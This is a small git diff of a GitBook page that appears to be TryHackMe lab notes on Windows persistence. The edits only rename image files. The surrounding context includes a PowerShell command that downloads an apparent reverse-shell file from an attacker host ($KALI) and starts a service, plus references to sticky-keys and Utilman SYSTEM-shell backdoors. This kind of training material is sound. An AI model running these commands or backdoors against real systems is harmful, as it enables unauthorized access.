@@ -347,7 +347,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/rev-
 </strong><strong>sc.exe start THMservice2
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (9) (2) (4).png" alt=""><figcaption></figcaption></figure>
 
@@ -793,7 +793,7 @@ You should now be able to press `SHIFT` five times to access a terminal with SYS
 
 Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen.
 
-<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1) (1) (5).png" alt=""><figcaption></figcaption></figure>
 
 
 
